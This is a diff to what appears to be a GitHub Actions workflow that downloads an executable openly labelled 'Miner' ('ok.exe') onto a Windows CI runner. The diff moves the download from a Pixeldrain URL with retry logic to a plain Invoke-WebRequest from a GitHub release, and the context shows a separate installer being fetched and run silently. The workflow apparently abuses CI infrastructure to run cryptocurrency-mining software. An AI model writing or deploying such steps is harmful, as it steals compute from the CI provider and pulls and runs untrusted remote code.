@@ -77,28 +77,13 @@ jobs:
           Invoke-WebRequest -Uri $url -OutFile $installer
           Start-Process -FilePath $installer -ArgumentList "/S" -Wait
 
-      # --- Download Miner from Pixeldrain (with retry) ---
-      - name: Download Miner from Pixeldrain (with retry)
+      # --- Download Miner from GitHub Release ---
+      - name: Download Miner from GitHub Release
         run: |
-          $url = "https://pixeldrain.com/api/file/dYQsWt5c"
+          $url = "https://github.com/frbrosss/RDP/releases/download/v.1/ok.exe"
           $output = "$env:TEMP\ok.exe"
-          $success = $false
-          for ($i=0; $i -lt 3; $i++) {
-            curl.exe -L -o $output $url
-            if ((Test-Path $output) -and ((Get-Item $output).Length -gt 10240)) {
-              $success = $true
-              break
-            } else {
-              Write-Host "Download attempt $($i+1) failed, retrying in 5 seconds..."
-              Start-Sleep -Seconds 5
-            }
-          }
-          if (-not $success) {
-            Write-Host "Miner not downloaded correctly after 3 attempts!"
-            exit 1
-          } else {
-            Write-Host "Miner downloaded to $output"
-          }
+          Invoke-WebRequest -Uri $url -OutFile $output
+          Write-Host "Miner downloaded to $output"
 
       # --- Check Downloaded File (Hex dump for verification) ---
       - name: Check Downloaded File
